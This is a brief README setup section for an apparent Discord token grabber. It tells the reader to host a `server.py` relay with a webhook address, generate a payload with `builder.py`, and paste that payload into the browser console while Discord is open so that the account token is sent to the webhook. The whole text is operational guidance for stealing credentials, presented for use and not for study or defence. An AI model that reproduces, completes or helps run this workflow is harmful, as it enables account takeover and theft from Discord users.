## Setup

1. Upload the `server.py` script to a hosting service such as Replit or any other hosting service of your choice.
2. Replace the text `YOUR WEBHOOK` in the `server.py` script with the webhook you want the token to be sent to.
3. Start the hosting service and copy the URL of the `server.py` script.
4. Run the `builder.py` script and enter the URL of the `server.py` script.
5. Copy the generated payload and paste it into the browser console while Discord is open in the tab. The token will be sent to the specified webhook.
